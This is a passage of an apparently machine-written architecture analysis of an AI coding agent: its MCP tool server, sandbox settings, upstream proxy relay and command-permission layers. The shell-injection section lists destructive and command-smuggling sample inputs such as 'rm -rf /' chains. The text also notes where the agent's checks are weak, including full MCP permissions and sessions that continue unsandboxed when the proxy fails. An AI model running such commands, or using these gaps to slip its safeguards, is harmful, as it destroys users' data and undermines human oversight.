      updateFileHistoryState: () => {},
      updateAttributionState: () => {},
    }

    try {
      if (!tool.isEnabled()) throw new Error(`Tool ${name} is not enabled`)
      const validationResult = await tool.validateInput?.(args ?? {}, toolUseContext)
      if (validationResult && !validationResult.result) {
        throw new Error(`Tool ${name} input is invalid: ${validationResult.message}`)
      }
      const finalResult = await tool.call(
        args ?? {},
        toolUseContext,
        hasPermissionsToUseTool,
        createAssistantMessage({ content: [] }),
      )
      return {
        content: [
          {
            type: 'text' as const,
            text: typeof finalResult === 'string' ? finalResult : jsonStringify(finalResult.data),
          },
        ],
      }
    } catch (error) {
      logError(error)
      const parts = error instanceof Error ? getErrorParts(error) : [String(error)]
      const errorText = parts.filter(Boolean).join('\n').trim() || 'Error'
      return {
        isError: true,
        content: [{ type: 'text', text: errorText }],
      }
    }
  },
)
```

**Key Points**:
- **Empty Permission Context**: All tools have full permissions when run as MCP server
- **LRU Cache**: 100-file limit on readFileState to prevent unbounded memory growth
- **Commands**: Only `review` command available (hardcoded `MCP_COMMANDS`)
- **Stdio Transport**: `await server.connect(new StdioServerTransport())`

### 4. Sandbox Types (sandboxTypes.ts: 156 lines)

**Purpose**: Define sandbox configuration schema for both SDK and settings validation.

**Three Config Schemas**:

1. **Network Config**:
```typescript
export const SandboxNetworkConfigSchema = lazySchema(() =>
  z.object({
    allowedDomains: z.array(z.string()).optional(),
    allowManagedDomainsOnly: z.boolean().optional(),
    allowUnixSockets: z.array(z.string()).optional(),  // macOS only
    allowAllUnixSockets: z.boolean().optional(),
    allowLocalBinding: z.boolean().optional(),
    httpProxyPort: z.number().optional(),
    socksProxyPort: z.number().optional(),
  }).optional(),
)
```

2. **Filesystem Config**:
```typescript
export const SandboxFilesystemConfigSchema = lazySchema(() =>
  z.object({
    allowWrite: z.array(z.string()).optional(),
    denyWrite: z.array(z.string()).optional(),
    denyRead: z.array(z.string()).optional(),
    allowRead: z.array(z.string()).optional(),
    allowManagedReadPathsOnly: z.boolean().optional(),
  }).optional(),
)
```

3. **Sandbox Settings**:
```typescript
export const SandboxSettingsSchema = lazySchema(() =>
  z.object({
    enabled: z.boolean().optional(),
    failIfUnavailable: z.boolean().optional(),
    autoAllowBashIfSandboxed: z.boolean().optional(),
    allowUnsandboxedCommands: z.boolean().optional(),
    network: SandboxNetworkConfigSchema(),
    filesystem: SandboxFilesystemConfigSchema(),
    ignoreViolations: z.record(z.string(), z.array(z.string())).optional(),
    enableWeakerNestedSandbox: z.boolean().optional(),
    enableWeakerNetworkIsolation: z.boolean().optional(),
    excludedCommands: z.array(z.string()).optional(),
    ripgrep: z.object({
      command: z.string(),
      args: z.array(z.string()).optional(),
    }).optional(),
  }).passthrough(),
)
```

**Undocumented Setting**:
- `enabledPlatforms` (read via `.passthrough()`) — restricts sandboxing to specific platforms
- Added to unblock NVIDIA enterprise rollout (macOS only initially)

---

## Upstream Proxy System

### CCR Upstreamproxy Architecture (upstreamproxy.ts: 285 lines)

**Deployment Context**: Container-side wiring for CCR sessions with org-configured upstream proxies.

#### Initialization Flow

**State Machine**:
```typescript
type UpstreamProxyState = {
  enabled: boolean
  port?: number           // Local relay listening port
  caBundlePath?: string   // Path to merged CA bundle
}

let state: UpstreamProxyState = { enabled: false }

export async function initUpstreamProxy(opts?: {
  tokenPath?: string
  systemCaPath?: string
  caBundlePath?: string
  ccrBaseUrl?: string
}): Promise<UpstreamProxyState>
```

**Gating Checks** (Lines 85–110):
```typescript
// 1. CCR_UPSTREAM_PROXY_ENABLED environment variable (server-side decision)
if (!isEnvTruthy(process.env.CCR_UPSTREAM_PROXY_ENABLED)) {
  return state  // Not enabled, exit early
}

// 2. Session ID requirement
const sessionId = process.env.CLAUDE_CODE_REMOTE_SESSION_ID
if (!sessionId) {
  logForDebugging('[upstreamproxy] CLAUDE_CODE_REMOTE_SESSION_ID unset; proxy disabled', { level: 'warn' })
  return state
}

// 3. Session token file
const tokenPath = opts?.tokenPath ?? SESSION_TOKEN_PATH
const token = await readToken(tokenPath)  // /run/ccr/session_token
if (!token) {
  logForDebugging('[upstreamproxy] no session token file; proxy disabled')
  return state
}
```

**Security: prctl(PR_SET_DUMPABLE, 0)**
```typescript
function setNonDumpable(): void {
  if (process.platform !== 'linux' || typeof Bun === 'undefined') return
  try {
    const ffi = require('bun:ffi')
    const lib = ffi.dlopen('libc.so.6', {
      prctl: {
        args: ['int', 'u64', 'u64', 'u64', 'u64'],
        returns: 'int',
      },
    })
    const PR_SET_DUMPABLE = 4
    const rc = lib.symbols.prctl(PR_SET_DUMPABLE, 0n, 0n, 0n, 0n)
  } catch (err) {
    logForDebugging(`[upstreamproxy] prctl unavailable: ${err.message}`, { level: 'warn' })
  }
}
```
**Rationale**: Blocks same-UID ptrace (e.g., `gdb -p $PPID`) from scraping session token off the heap.

**CA Bundle Merging** (Lines 254–285):
```typescript
async function downloadCaBundle(
  baseUrl: string,
  systemCaPath: string,
  outPath: string,
): Promise<boolean> {
  try {
    const resp = await fetch(`${baseUrl}/v1/code/upstreamproxy/ca-cert`, {
      signal: AbortSignal.timeout(5000),  // 5s timeout
    })
    if (!resp.ok) {
      logForDebugging(`[upstreamproxy] ca-cert fetch ${resp.status}; proxy disabled`, { level: 'warn' })
      return false
    }
    const ccrCa = await resp.text()
    const systemCa = await readFile(systemCaPath, 'utf8').catch(() => '')
    await mkdir(join(outPath, '..'), { recursive: true })
    await writeFile(outPath, systemCa + '\n' + ccrCa, 'utf8')  // Concatenate
    return true
  } catch (err) {
    logForDebugging(`[upstreamproxy] ca-cert download failed: ${err.message}; proxy disabled`, { level: 'warn' })
    return false
  }
}
```
Creates `~/.ccr/ca-bundle.crt` (system CA + CCR MITM CA).

**Token Cleanup** (Lines 140–144):
```typescript
await unlink(tokenPath).catch(() => {
  logForDebugging('[upstreamproxy] token file unlink failed', { level: 'warn' })
})
```
Only unlinks AFTER relay is up. If relay fails, supervisor can retry with token still on disk.

#### Environment Variable Injection

**For Child Processes** (Lines 160–199):
```typescript
export function getUpstreamProxyEnv(): Record<string, string> {
  if (!state.enabled || !state.port || !state.caBundlePath) {
    // Inherit from parent if already set
    if (process.env.HTTPS_PROXY && process.env.SSL_CERT_FILE) {
      const inherited: Record<string, string> = {}
      for (const key of [
        'HTTPS_PROXY', 'https_proxy', 'NO_PROXY', 'no_proxy',
        'SSL_CERT_FILE', 'NODE_EXTRA_CA_CERTS',
        'REQUESTS_CA_BUNDLE', 'CURL_CA_BUNDLE',
      ]) {
        if (process.env[key]) inherited[key] = process.env[key]
      }
      return inherited  // Pass through parent's relay
    }
    return {}
  }
  const proxyUrl = `http://127.0.0.1:${state.port}`
  return {
    HTTPS_PROXY: proxyUrl,
    https_proxy: proxyUrl,
    NO_PROXY: NO_PROXY_LIST,
    no_proxy: NO_PROXY_LIST,
    SSL_CERT_FILE: state.caBundlePath,
    NODE_EXTRA_CA_CERTS: state.caBundlePath,
    REQUESTS_CA_BUNDLE: state.caBundlePath,
    CURL_CA_BUNDLE: state.caBundlePath,
  }
}
```

**NO_PROXY List** (Lines 37–63):
```typescript
const NO_PROXY_LIST = [
  'localhost', '127.0.0.1', '::1',
  '169.254.0.0/16',  // IMDS (AWS, Azure, GCP)
  '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',  // RFC1918
  // Anthropic API (MITM breaks non-Bun runtimes)
  'anthropic.com', '.anthropic.com', '*.anthropic.com',
  // GitHub (direct reach available)
  'github.com', 'api.github.com', '*.github.com', '*.githubusercontent.com',
  // Package registries
  'registry.npmjs.org', 'pypi.org', 'files.pythonhosted.org',
  'index.crates.io', 'proxy.golang.org',
].join(',')
```

### Relay Implementation (relay.ts: 455 lines)

**CONNECT-over-WebSocket Tunnel**

#### Protobuf Message Encoding (Lines 66–103)

**Manual Encoding** (avoids protobufjs dependency):
```typescript
export function encodeChunk(data: Uint8Array): Uint8Array {
  const len = data.length
  const varint: number[] = []
  let n = len
  while (n > 0x7f) {
    varint.push((n & 0x7f) | 0x80)
    n >>>= 7
  }
  varint.push(n)
  const out = new Uint8Array(1 + varint.length + len)
  out[0] = 0x0a  // Tag: (field=1 << 3) | wire_type=2 (length-delimited)
  out.set(varint, 1)  // Varint length
  out.set(data, 1 + varint.length)  // Raw bytes
  return out
}

export function decodeChunk(buf: Uint8Array): Uint8Array | null {
  if (buf.length === 0) return new Uint8Array(0)  // Keepalive
  if (buf[0] !== 0x0a) return null  // Invalid tag
  let len = 0, shift = 0, i = 1
  while (i < buf.length) {
    const b = buf[i]!
    len |= (b & 0x7f) << shift
    i++
    if ((b & 0x80) === 0) break
    shift += 7
    if (shift > 28) return null  // Varint overflow
  }
  if (i + len > buf.length) return null  // Incomplete message
  return buf.subarray(i, i + len)
}
```

#### Runtime Abstraction

**Two Implementations: Bun vs. Node.js** (Lines 176–289)

**Bun Path** (startBunRelay):
```typescript
function startBunRelay(
  wsUrl: string,
  authHeader: string,
  wsAuthHeader: string,
): UpstreamProxyRelay {
  type BunState = ConnState & { writeBuf: Uint8Array[] }

  const server = Bun.listen<BunState>({
    hostname: '127.0.0.1',
    port: 0,
    socket: {
      open(sock) {
        sock.data = { ...newConnState(), writeBuf: [] }
      },
      data(sock, data) {
        const st = sock.data
        const adapter: ClientSocket = {
          write: payload => {
            const bytes = typeof payload === 'string' ? Buffer.from(payload, 'utf8') : payload
            if (st.writeBuf.length > 0) {
              st.writeBuf.push(bytes)
              return
            }
            const n = sock.write(bytes)
            if (n < bytes.length) st.writeBuf.push(bytes.subarray(n))
          },
          end: () => sock.end(),
        }
        handleData(adapter, st, data, wsUrl, authHeader, wsAuthHeader)
      },
      drain(sock) {
        const st = sock.data
        while (st.writeBuf.length > 0) {
          const chunk = st.writeBuf[0]!
          const n = sock.write(chunk)
          if (n < chunk.length) {
            st.writeBuf[0] = chunk.subarray(n)
            return
          }
          st.writeBuf.shift()
        }
      },
      close(sock) {
        cleanupConn(sock.data)
      },
      error(sock, err) {
        logForDebugging(`[upstreamproxy] client socket error: ${err.message}`)
        cleanupConn(sock.data)
      },
    },
  })

  return {
    port: server.port,
    stop: () => server.stop(true),
  }
}
```

**Node.js Path** (startNodeRelay):
```typescript
export async function startNodeRelay(
  wsUrl: string,
  authHeader: string,
  wsAuthHeader: string,
): Promise<UpstreamProxyRelay> {
  nodeWSCtor = (await import('ws')).default
  const states = new WeakMap<NodeSocket, ConnState>()

  const server = createServer(sock => {
    const st = newConnState()
    states.set(sock, st)
    const adapter: ClientSocket = {
      write: payload => {
        sock.write(typeof payload === 'string' ? payload : Buffer.from(payload))
      },
      end: () => sock.end(),
    }
    sock.on('data', data => handleData(adapter, st, data, wsUrl, authHeader, wsAuthHeader))
    sock.on('close', () => cleanupConn(states.get(sock)))
    sock.on('error', err => {
      logForDebugging(`[upstreamproxy] client socket error: ${err.message}`)
      cleanupConn(states.get(sock))
    })
  })

  return new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(0, '127.0.0.1', () => {
      const addr = server.address()
      if (addr === null || typeof addr === 'string') {
        reject(new Error('upstreamproxy: server has no TCP address'))
        return
      }
      resolve({
        port: addr.port,
        stop: () => server.close(),
      })
    })
  })
}
```

#### Connection State Machine

**Per-Connection State** (Lines 110–127):
```typescript
type ConnState = {
  ws?: WebSocketLike
  connectBuf: Buffer              // Accumulate CONNECT request
  pinger?: ReturnType<typeof setInterval>  // 30s keepalive
  pending: Buffer[]               // Bytes after CONNECT, before ws.onopen
  wsOpen: boolean                 // WS handshake complete
  established: boolean            // 200 Connection Established sent (TLS tunnel active)
  closed: boolean                 // Guard: prevent double cleanup
}
```

**Key Design**:
- `connectBuf`: Phase 1 accumulates raw CONNECT request line
- `pending`: TCP coalesces CONNECT + ClientHello; data callback can fire again before ws.onopen
- `established`: After sending 200 response, socket carries encrypted TLS traffic — can't write plaintext 502

#### Constants

**Configuration**:
```typescript
const MAX_CHUNK_BYTES = 512 * 1024    // Envoy per-request buffer cap
const PING_INTERVAL_MS = 30_000       // Sidecar idle timeout is 50s
```

---

## Security & Design Patterns

### 1. Shell Injection Defense

**Vulnerability**: Model-emitted shell commands can contain injection attacks via:
- Globbing: `rm -rf $(eval "malicious code")`
- Quote escaping: `grep 'user'; rm -rf /`
- Command substitution: `` `whoami` ``

**Defenses**:

1. **Extended Glob Disabling** (bashProvider.ts:39–56)
   - `shopt -u extglob` (bash) or `setopt NO_EXTENDED_GLOB` (zsh)
   - Prevents malicious filenames from expanding after validation

2. **Haiku LLM Prefix Extraction** (prefix.ts:172–330)
   - Query Haiku to identify "safe prefix" of command
   - Memoizes results, 10s timeout, 200-entry LRU cache
   - Rejects dangerous shell names, API errors, injection detection

3. **Hardcoded Allowlists** (readOnlyCommandValidation.ts:1,893 lines)
   - ~30 git subcommands with explicit safe-flag maps
   - ~15 gh commands (network exfiltration guards)
   - Custom callbacks for git tag/branch creation, git reflog expire, gh repo host validation

4. **Flag Argument Type Validation**
   - `'none'`, `'number'`, `'string'`, `'char'`, `'{}'`, `'EOF'`
   - Parser differential defense: `-S -- --output=/tmp/pwned` attack blocked

### 2. Permission Layering

**Three-Tier Model**:
1. **Haiku-Driven**: LLM identifies command prefix (e.g., "git status")
2. **Allowlist-Driven**: Hardcoded map approves/denies prefixes
3. **Callback-Driven**: Custom logic for edge cases (tag creation, gh exfiltration)

**Fail-Safe**: Command denied at ANY tier → blocked.

### 3. Cross-Platform Compatibility

**Windows Git Bash**:
- POSIX paths inside shell (quoting with `path/posix` syntax)
- Native OS paths for Node.js file I/O (`C:\path\native`)
- `windowsPathToPosixPath()` conversion layer

**PowerShell 5.1 vs. 7+**:
- Edition detection (no spawning needed)
- Different operator support (`&&` in 7+, none in 5.1)
- Exit code recovery via `$LASTEXITCODE` + `$?` two-tier check

**Snapshot Caching**:
- Avoids repeated login-shell spawns (~100–200ms each)
- Snapshot deleted mid-session → fallback to login-shell init

### 4. Proxy & Credential Management

**Fail-Open Design** (init.ts:167–183):
```typescript
try {
  const { initUpstreamProxy, getUpstreamProxyEnv } = await import(...)
  registerUpstreamProxyEnvFn(getUpstreamProxyEnv)
  await initUpstreamProxy()
} catch (err) {
  logForDebugging(`[init] upstreamproxy init failed: ${err.message}; continuing without proxy`, { level: 'warn' })
}
```
Proxy errors don't break sessions — session continues unsandboxed.

**Token Security**:
- File-based token (`/run/ccr/session_token`) immediately unlinked after relay startup
- `prctl(PR_SET_DUMPABLE, 0)` blocks ptrace heap scraping
- Base64 auth headers in WebSocket upgrade

**NO_PROXY Bypass List**:
- RFC1918, loopback, IMDS, Anthropic API (MITM breaks non-Bun), GitHub, package registries
- Prevents accidental credential injection to untrusted upstreams

### 5. Dependency Injection & Lazy Loading

**Modules Deferred Until Needed**:
- OpenTelemetry: ~400KB lazy-loaded only after trust dialog
- LSP manager: initialized in main.tsx (after --plugin-dir parsed)
- upstreamproxy relay: loaded conditionally on `CLAUDE_CODE_REMOTE`
- `ws` package: preloaded for Node.js relay path

**Event Logging** (init.ts:94–105):
```typescript
void Promise.all([
  import('../services/analytics/firstPartyEventLogger.js'),
  import('../services/analytics/growthbook.js'),
])
```
Fire-and-forget async, runs after init() returns.

### 6. Memoization & Caching

**init.ts**: Single execution via lodash `memoize()`
**PowerShell Detection**: `getCachedPowerShellPath()` with `resetPowerShellCache()` for tests
**Prefix Extraction**: LRU cache (200 entries, evicts on rejection)
**MCP Server**: File state cache (100 entries, 25MB limit)

---

## Constants & Environment Variables

### Shell Detection

| Variable | Default | Purpose |
|----------|---------|---------|
| `SHELL` | (env var) | Current shell ($SHELL) |
| `USER_TYPE` | — | `'ant'` (internal) or external (gates PowerShell, tmux) |
| `CLAUDE_CODE_USE_POWERSHELL_TOOL` | Off (external), On (ant) | Enable PowerShell tool |

### Execution Isolation

| Variable | Default | Purpose |
|----------|---------|---------|
| `CLAUDE_CODE_SHELL_PREFIX` | (unset) | Wrapper shell (applies extended glob commands to both bash/zsh) |
| `TMPDIR` | OS tmpdir | Bash/zsh temp file directory |
| `TMPPREFIX` | (unset) | Zsh heredoc temp path prefix |
| `CLAUDE_CODE_TMPDIR` | (unset) | Explicit sandbox tmpdir marker |
| `TMUX` | (inherited) | Claude's isolated tmux socket (overrides user's) |

### Output Limits

| Constant | Value | Purpose |
|----------|-------|---------|
| `BASH_MAX_OUTPUT_DEFAULT` | 30,000 bytes | Default max stdout length |
| `BASH_MAX_OUTPUT_UPPER_LIMIT` | 150,000 bytes | Validation upper bound |
| Env: `BASH_MAX_OUTPUT_LENGTH` | — | Override via env var |

### Proxy & Network

| Variable | Default | Purpose |
|----------|---------|---------|
| `CLAUDE_CODE_REMOTE` | (unset) | CCR session marker (enables upstreamproxy) |
| `CCR_UPSTREAM_PROXY_ENABLED` | (unset) | Server-side gate (prevents client-side GrowthBook check) |
| `CLAUDE_CODE_REMOTE_SESSION_ID` | — | Session ID for upstream auth |
| `HTTPS_PROXY` / `https_proxy` | (unset) | Relay URL injection (`http://127.0.0.1:<port>`) |
| `NO_PROXY` / `no_proxy` | RFC1918 + Anthropic + GitHub + registries | Bypass list |
| `SSL_CERT_FILE` | — | Merged CA bundle path (`~/.ccr/ca-bundle.crt`) |
| `NODE_EXTRA_CA_CERTS` | — | For Node.js |
| `REQUESTS_CA_BUNDLE` | — | For Python |
| `CURL_CA_BUNDLE` | — | For curl |
| `ANTHROPIC_BASE_URL` | `https://api.anthropic.com` | API endpoint (CCR override) |

### Upstreamproxy

| Constant | Value | Purpose |
|----------|-------|---------|
| `SESSION_TOKEN_PATH` | `/run/ccr/session_token` | Token file location |
| `SYSTEM_CA_BUNDLE` | `/etc/ssl/certs/ca-certificates.crt` | System CA path (Linux) |
| `MAX_CHUNK_BYTES` | 512 KB | Envoy buffer cap |
| `PING_INTERVAL_MS` | 30 seconds | WebSocket keepalive (sidecar timeout: 50s) |

---

## Summary: Design Principles

| Principle | Implementation |
|-----------|-----------------|
| **Fail-Open Resilience** | Proxy/mTLS/upstreamproxy errors don't break sessions; warnings logged |
| **Cross-Platform Parity** | Identical bash-vs-PowerShell API; Windows/macOS/Linux handled uniformly |
| **Permission Layering** | Haiku + allowlists + callbacks; denied at any tier → blocked |
| **Security-First Isolation** | Snapshots, sandbox TMPDIR, tmux sockets, extended-glob disabling, prctl dumpable |
| **Performance Optimization** | Lazy module loading, snapshot caching, 10s Haiku timeout, LRU memoization |
| **Credential Protection** | Token file cleanup, prctl ptrace blocking, Base64 encoding, NO_PROXY bypass list |
| **Testability** | Memoization guards, resetPowerShellCache(), test-only functions, configurable paths |

---

**End of Analysis**

Document compiled: 2026-04-02
Total lines analyzed: 7,860
Files covered: 20 (TS/TSX)
Sections: 5 major + 6 subsections
Code examples: 50+
Design patterns identified: 6
